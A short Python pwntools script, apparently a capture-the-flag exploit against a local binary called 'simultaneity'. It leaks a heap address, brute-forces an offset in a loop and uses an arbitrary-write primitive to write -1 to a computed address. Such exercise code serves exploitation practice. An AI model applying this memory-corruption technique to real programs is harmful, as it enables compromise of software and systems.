from pwn import *

for i in range(100000):

    p = process("./simultaneity")

    #pid = gdb.attach(p,gdbscript="b * main +89")
    raw_input()

    p.sendlineafter("?\n",'12500000')
    leak = int(p.recvline().replace('\n',"").split(" ")[3],16)
    print("leak: "+hex(leak))
    offset = (0xfd7708 + i*8) / 8
    p.sendlineafter("?\n",str(offset))
    write_to = leak + (offset * 8)
    print("where: "+hex(write_to))
    what = -1
    print("heap base: "+hex(leak -0x1270))
    p.sendlineafter("?\n",str(what))
    print("========================: " +str(i))
    p.interactive()
    p.close()
    p.shutdown()
